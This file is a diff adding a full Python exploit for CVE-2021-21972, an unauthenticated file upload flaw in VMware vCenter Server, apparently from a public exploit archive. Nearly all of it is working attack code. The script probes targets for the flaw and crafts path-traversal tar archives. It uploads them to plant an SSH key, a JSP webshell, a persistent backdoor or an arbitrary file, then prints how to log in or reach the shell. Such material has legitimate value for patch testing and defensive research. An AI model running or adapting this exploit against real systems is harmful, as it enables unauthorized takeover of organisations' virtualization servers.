@@ -1,0 +1,239 @@
+# Exploit Title: VMware vCenter Server 7.0 - Unauthenticated File Upload
+# Date: 2021-02-27
+# Exploit Author: Photubias
+# Vendor Advisory: [1] https://www.vmware.com/security/advisories/VMSA-2021-0002.html
+# Version: vCenter Server 6.5 (7515524<[vulnerable]<17590285), vCenter Server 6.7 (<17138064) and vCenter Server 7 (<17327517)
+# Tested on: vCenter Server Appliance 6.5, 6.7 & 7.0, multiple builds
+# CVE: CVE-2021-21972
+
+#!/usr/bin/env python3
+'''
+    Copyright 2021 Photubias(c)        
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+    
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+    
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+    
+    File name CVE-2021-21972.py
+    written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be
+
+    CVE-2021-21972 is an unauthenticated file upload and overwrite,
+     exploitation can be done via SSH public key upload or a webshell
+     The webshell must be of type JSP, and its success depends heavily on the specific vCenter version
+    
+    # Manual verification:  https://<ip>/ui/vropspluginui/rest/services/checkmobregister
+    #  A white page means vulnerable
+    #  A 401 Unauthorized message means patched or workaround implemented (or the system is not completely booted yet)
+    # Notes:
+    #  * On Linux SSH key upload is always best, when SSH access is possible & enabled
+    #  * On Linux the upload is done as user vsphere-ui:users
+    #  * On Windows the upload is done as system user
+    #  * vCenter 6.5 <=7515524 does not contain the vulnerable component "vropspluginui"
+    #  * vCenter 6.7U2 and up are running the Webserver in memory, so backdoor the system (active after reboot) or use SSH payload
+    
+    This is a native implementation without requirements, written in Python 3.
+    Works equally well on Windows as Linux (as MacOS, probably ;-)
+    
+    Features: vulnerability checker + exploit
+'''
+
+import os, tarfile, sys, optparse, requests
+requests.packages.urllib3.disable_warnings()
+
+lProxy = {}
+SM_TEMPLATE = b'''<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+      <env:Body>
+      <RetrieveServiceContent xmlns="urn:vim25">
+        <_this type="ServiceInstance">ServiceInstance</_this>
+      </RetrieveServiceContent>
+      </env:Body>
+      </env:Envelope>'''
+sURL = sFile = sRpath = sType = None
+
+def parseArguments(options):
+    global sURL, sFile, sType, sRpath, lProxy
+    if not options.url or not options.file: exit('[-] Error: please provide at least an URL and a FILE to upload.')
+    sURL = options.url
+    if sURL[-1:] == '/': sURL = sURL[:-1]
+    if not sURL[:4].lower() == 'http': sURL = 'https://' + sURL
+    sFile = options.file
+    if not os.path.exists(sFile): exit('[-] File not found: ' + sFile)
+    sType = 'ssh'
+    if options.type: sType = options.type
+    if options.rpath: sRpath = options.rpath
+    else: sRpath = None
+    if options.proxy: lProxy = {'https': options.proxy}
+
+def getVersion(sURL):
+    def getValue(sResponse, sTag = 'vendor'):
+        try: return sResponse.split('<' + sTag + '>')[1].split('</' + sTag + '>')[0]
+        except: pass
+        return ''
+    oResponse = requests.post(sURL + '/sdk', verify = False, proxies = lProxy, timeout = 5, data = SM_TEMPLATE)
+    #print(oResponse.text)
+    if oResponse.status_code == 200:
+        sResult = oResponse.text
+        if not 'VMware' in getValue(sResult, 'vendor'):
+            exit('[-] Not a VMware system: ' + sURL)
+        else:
+            sName = getValue(sResult, 'name')
+            sVersion = getValue(sResult, 'version') # e.g. 7.0.0
+            sBuild = getValue(sResult, 'build') # e.g. 15934073
+            sFull = getValue(sResult, 'fullName')
+            print('[+] Identified: ' + sFull)
+            return sVersion, sBuild
+    exit('[-] Not a VMware system: ' + sURL)
+
+def verify(sURL):
+    #return True
+    sURL += '/ui/vropspluginui/rest/services/uploadova'
+    try:
+        oResponse = requests.get(sURL, verify=False, proxies = lProxy, timeout = 5)
+    except:
+        exit('[-] System not available: ' + sURL)
+    if oResponse.status_code == 405: return True ## A patched system returns 401, but also if it is not booted completely
+    else: return False
+
+def createTarLin(sFile, sType, sVersion, sBuild, sRpath = None):
+    def getResourcePath():
+        oResponse = requests.get(sURL + '/ui', verify = False, proxies = lProxy, timeout = 5)
+        return oResponse.text.split('static/')[1].split('/')[0]
+    oTar = tarfile.open('payloadLin.tar','w')
+    if sRpath: ## version & build not important
+        if sRpath[0] == '/': sRpath = sRpath[1:]
+        sPayloadPath = '../../' + sRpath
+        oTar.add(sFile, arcname=sPayloadPath)
+        oTar.close()
+        return 'absolute'
+    elif sType.lower() == 'ssh': ## version & build not important
+        sPayloadPath = '../../home/vsphere-ui/.ssh/authorized_keys'
+        oTar.add(sFile, arcname=sPayloadPath)
+        oTar.close()
+        return 'ssh'
+    elif (int(sVersion.split('.')[0]) == 6 and int(sVersion.split('.')[1]) == 5) or (int(sVersion.split('.')[0]) == 6 and int(sVersion.split('.')[1]) == 7 and int(sBuild) < 13010631):
+        ## vCenter 6.5/6.7 < 13010631, just this location with a subnumber
+        sPayloadPath = '../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/' + os.path.basename(sFile)
+        print('[!] Selected uploadpath: ' + sPayloadPath[5:])
+        for i in range(112): oTar.add(sFile, arcname=sPayloadPath % i)
+        oTar.close()
+        return 'webshell'
+    elif (int(sVersion.split('.')[0]) == 6 and int(sVersion.split('.')[1]) == 7 and int(sBuild) >= 13010631):
+        ## vCenter 6.7 >= 13010631, webshell not an option, but backdoor works when put at /usr/lib/vmware-vsphere-ui/server/static/resources/libs/<thefile>
+        sPayloadPath = '../../usr/lib/vmware-vsphere-ui/server/static/resources/libs/' + os.path.basename(sFile)
+        print('[!] Selected uploadpath: ' + sPayloadPath[5:])
+        oTar.add(sFile, arcname=sPayloadPath)
+        oTar.close()
+        return 'backdoor'
+    else: #(int(sVersion.split('.')[0]) == 7 and int(sVersion.split('.')[1]) == 0):
+        ## vCenter 7.0, backdoor webshell, but dynamic location (/usr/lib/vmware-vsphere-ui/server/static/resources15863815/libs/<thefile>)
+        sPayloadPath = '../../usr/lib/vmware-vsphere-ui/server/static/' + getResourcePath() + '/libs/' + os.path.basename(sFile)
+        print('[!] Selected uploadpath: ' + sPayloadPath[5:])
+        oTar.add(sFile, arcname=sPayloadPath)
+        oTar.close()
+        return 'backdoor'
+    
+
+def createTarWin(sFile, sRpath = None):
+    ## vCenter only (uploaded as administrator), vCenter 7+ did not exist for Windows
+    if sRpath:
+        if sRpath[0] == '/': sRpath = sRpath[:1]
+        sPayloadPath = '../../' + sRpath
+    else:
+        sPayloadPath = '../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/' + os.path.basename(sFile)
+    oTar = tarfile.open('payloadWin.tar','w')
+    oTar.add(sFile, arcname=sPayloadPath)
+    oTar.close()
+
+def uploadFile(sURL, sUploadType, sFile):
+    #print('[!] Uploading ' + sFile)
+    sFile = os.path.basename(sFile)
+    sUploadURL = sURL +  '/ui/vropspluginui/rest/services/uploadova'
+    arrLinFiles = {'uploadFile': ('1.tar', open('payloadLin.tar', 'rb'), 'application/octet-stream')}
+    ## Linux
+    oResponse = requests.post(sUploadURL, files = arrLinFiles, verify = False, proxies = lProxy)
+    if oResponse.status_code == 200:
+        if oResponse.text == 'SUCCESS':
+            print('[+] Linux payload uploaded succesfully.')
+            if sUploadType == 'ssh':
+                print('[+] SSH key installed for user \'vsphere-ui\'.')
+                print('     Please run \'ssh vsphere-ui@' + sURL.replace('https://','') + '\'')
+                return True
+            elif sUploadType == 'webshell':
+                sWebshell = sURL + '/ui/resources/' + sFile
+                #print('testing ' + sWebshell)
+                oResponse = requests.get(sWebshell, verify=False, proxies = lProxy)
+                if oResponse.status_code != 404:
+                    print('[+] Webshell verified, please visit: ' + sWebshell)
+                    return True
+            elif sUploadType == 'backdoor':
+                sWebshell = sURL + '/ui/resources/' + sFile
+                print('[+] Backdoor ready, please reboot or wait for a reboot')
+                print('     then open: ' + sWebshell)
+            else: ## absolute
+                pass
+    ## Windows
+    arrWinFiles = {'uploadFile': ('1.tar', open('payloadWin.tar', 'rb'), 'application/octet-stream')}
+    oResponse = requests.post(sUploadURL, files=arrWinFiles, verify = False, proxies = lProxy)
+    if oResponse.status_code == 200:
+        if oResponse.text == 'SUCCESS':
+            print('[+] Windows payload uploaded succesfully.')
+            if sUploadType == 'backdoor':
+                print('[+] Absolute upload looks OK')
+                return True
+            else:
+                sWebshell = sURL + '/statsreport/' + sFile
+                oResponse = requests.get(sWebshell, verify=False, proxies = lProxy)
+                if oResponse.status_code != 404:
+                    print('[+] Webshell verified, please visit: ' + sWebshell)
+                    return True
+    return False
+
+if __name__ == "__main__":
+    usage = (
+        'Usage: %prog [option]\n'
+        'Exploiting Windows & Linux vCenter Server\n'
+        'Create SSH keys: ssh-keygen -t rsa -f id_rsa -q -N \'\'\n'
+        'Note1: Since the 6.7U2+ (b13010631) Linux appliance, the webserver is in memory. Webshells only work after reboot\n'
+        'Note2: Windows is the most vulnerable, but less mostly deprecated anyway')
+
+    parser = optparse.OptionParser(usage=usage)
+    parser.add_option('--url', '-u', dest='url', help='Required; example https://192.168.0.1')
+    parser.add_option('--file', '-f', dest='file', help='Required; file to upload: e.g. id_rsa.pub in case of ssh or webshell.jsp in case of webshell')
+    parser.add_option('--type', '-t', dest='type', help='Optional; ssh/webshell, default: ssh')
+    parser.add_option('--rpath', '-r', dest='rpath', help='Optional; specify absolute remote path, e.g. /tmp/testfile or /Windows/testfile')
+    parser.add_option('--proxy', '-p', dest='proxy', help='Optional; configure a HTTPS proxy, e.g. http://127.0.0.1:8080')
+    
+    (options, args) = parser.parse_args()
+       
+    parseArguments(options)
+       
+    ## Verify
+    if verify(sURL): print('[+] Target vulnerable: ' + sURL)
+    else: exit('[-] Target not vulnerable: ' + sURL)
+    
+    ## Read out the version
+    sVersion, sBuild = getVersion(sURL)
+    if sRpath: print('[!] Ready to upload your file to ' + sRpath)
+    elif sType.lower() == 'ssh': print('[!] Ready to upload your SSH keyfile \'' + sFile + '\'')
+    else: print('[!] Ready to upload webshell \'' + sFile + '\'')
+    sAns = input('[?] Want to exploit? [y/N]: ')
+    if not sAns or not sAns[0].lower() == 'y': exit()
+    
+    ## Create TAR file
+    sUploadType = createTarLin(sFile, sType, sVersion, sBuild, sRpath)
+    if not sUploadType == 'ssh': createTarWin(sFile, sRpath)
+
+    ## Upload and verify
+    uploadFile(sURL, sUploadType, sFile)
+    
+    ## Cleanup
+    os.remove('payloadLin.tar')
+    os.remove('payloadWin.tar')
